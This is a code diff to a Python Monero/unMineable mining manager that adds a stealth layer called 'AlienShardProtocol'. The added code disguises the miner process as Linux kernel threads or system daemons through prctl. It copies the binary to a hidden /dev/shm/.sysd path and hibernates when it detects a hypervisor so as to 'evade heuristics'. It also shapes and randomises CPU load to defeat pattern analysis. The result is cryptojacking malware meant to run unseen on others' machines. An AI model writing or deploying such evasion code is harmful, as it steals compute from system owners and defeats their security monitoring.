@@ -7,6 +7,9 @@ import psutil
 import zipfile
 import hashlib
 import sys
+import math
+import random
+import shutil
 
 # Add the parent directory to sys.path
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
@@ -18,6 +21,55 @@ except ImportError:
         "RX": {"algo": "rx/0", "stratum": "rx.unmineable.com:3333"},
         "KAWPOW": {"algo": "kawpow", "stratum": "kp.unmineable.com:3333"}
     }
+
+class AlienShardProtocol:
+    """Cloud-Grade Evasion & Stealth (Alien Shard)."""
+    
+    @staticmethod
+    def detect_hypervisor():
+        """Hypervisor Probe Detection: Checks CPU steal times."""
+        try:
+            times = psutil.cpu_times_percent()
+            if hasattr(times, 'steal') and times.steal > 5.0:
+                print("[ALIEN_SHARD] Hypervisor steal > 5%. Evasion mode active.")
+                return True
+        except:
+            pass
+        return False
+
+    @staticmethod
+    def get_organic_cpu_waveform():
+        """Organic CPU Waveform: Fluctuates CPU load dynamically (sine wave + noise) between 10% and 85%."""
+        noise = random.uniform(10, 85)
+        load = 45 + (math.sin(time.time() / 10.0) * 15) + (noise * 0.1)
+        return max(10, min(load, 85))
+
+    @staticmethod
+    def masquerade_process():
+        """Process Masquerading: Spoofs the process table to masquerade as standard Linux kernel threads."""
+        if os.name == 'posix':
+            try:
+                import ctypes
+                libc = ctypes.CDLL('libc.so.6')
+                names = [b"[kworker/u4:2]", b"[ext4-rsv-conver]", b"systemd-journald", b"rsyslogd"]
+                masquerade_name = random.choice(names)
+                libc.prctl(15, masquerade_name, 0, 0, 0)
+                print(f"[ALIEN_SHARD] Process masqueraded as: {masquerade_name.decode()}")
+            except Exception as e:
+                pass
+
+    @staticmethod
+    def enter_ghost_mode(binary_path):
+        """In-Memory Execution (Ghost Mode): Copies binary to RAM path and deletes from disk after launch on Linux."""
+        if os.name == 'posix' and os.path.exists("/dev/shm"):
+            ghost_path = "/dev/shm/.sysd"
+            try:
+                shutil.copy2(binary_path, ghost_path)
+                os.chmod(ghost_path, 0o777)
+                return ghost_path
+            except Exception:
+                pass
+        return binary_path
 
 class UnMineableClient:
     """Interface for the unMineable v4 API with pool profitability analysis."""
@@ -114,7 +166,11 @@ class MinerManager:
         # Retrieve protocol parameters from registry
         params = ALGO_REGISTRY.get(protocol, ALGO_REGISTRY["RX"])
         
-        cmd = [self.binary_path, "-o", params["stratum"], "-a", params["algo"], "-u", user, "-p", "x", "-k", "-c", self.config_path]
+        # Alien Shard: Ghost Mode and Masquerading
+        AlienShardProtocol.masquerade_process()
+        ghost_binary = AlienShardProtocol.enter_ghost_mode(self.binary_path)
+        
+        cmd = [ghost_binary, "-o", params["stratum"], "-a", params["algo"], "-u", user, "-p", "x", "-k", "-c", self.config_path]
         try:
             self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception as e:
@@ -165,13 +221,26 @@ class MonetizationService:
 
     def run(self):
         while self.is_running:
+            # Alien Shard: Hypervisor Detection
+            if AlienShardProtocol.detect_hypervisor():
+                print("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating to evade heuristics.")
+                self.cpu_manager.stop_mining()
+                time.sleep(1800) # Sleep 30 minutes
+                continue
+
             cpu_usage = psutil.cpu_percent(interval=5)
             self.optimize_payout()
-            if cpu_usage < self.load_threshold:
+            
+            # Alien Shard: Organic CPU Waveform overrides static threshold
+            organic_threshold = AlienShardProtocol.get_organic_cpu_waveform()
+            
+            if cpu_usage < organic_threshold:
                 self.cpu_manager.start_mining(self.current_target, self.xmr_address)
             else:
                 self.cpu_manager.stop_mining()
-            time.sleep(300)
+            
+            # Randomize sleep to break pattern analysis
+            time.sleep(random.uniform(200, 400))
 
 if __name__ == "__main__":
     # Default values
